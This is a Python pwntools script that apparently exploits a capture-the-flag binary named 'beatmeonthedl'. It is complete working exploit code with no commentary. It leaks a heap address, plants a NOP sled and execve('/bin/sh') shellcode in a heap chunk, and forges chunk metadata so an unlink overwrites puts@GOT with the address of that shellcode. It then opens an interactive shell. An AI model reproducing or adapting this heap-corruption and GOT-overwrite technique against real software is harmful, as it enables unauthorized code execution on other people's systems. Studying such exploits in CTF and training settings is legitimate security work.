from pwn import *
import time

p = process(["./beatmeonthedl"])
context.binary = "./beatmeonthedl"
#context.log_level = 'debug'
prog = log.progress("Exploit ")
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
puts_got = 0x609958
log.success(str(proc.pidof(p)[0]))
#pause()

p.recv()
p.sendline("mcfly")
p.recv()
p.sendline("B" * 0x18)

p.recvuntil("B" * 0x18)
leak = u32(p.recv(4)) - 0x10
print hex(leak)
print p.recv()

p.sendline("mcfly")
p.recv()
p.sendline("awesnap")

def add_req(payload):
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline(payload)
add_req("AAAA")
add_req("BBBB")
add_req("CCCC")
add_req("\xeb\x30" + "\x90" * 0x40 + sc)

print p.recv()
p.sendline("3")
print p.recv()
p.sendline("1")

print p.recv()
p.sendline("4")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("Q" * 0x30 + p64(0) + p64(0x41) + p64(puts_got-24) + p64(leak + (0x40 * 4) + 0x10))

print p.recv()
p.sendline("3")
print p.recv()
p.sendline("2")

p.interactive()
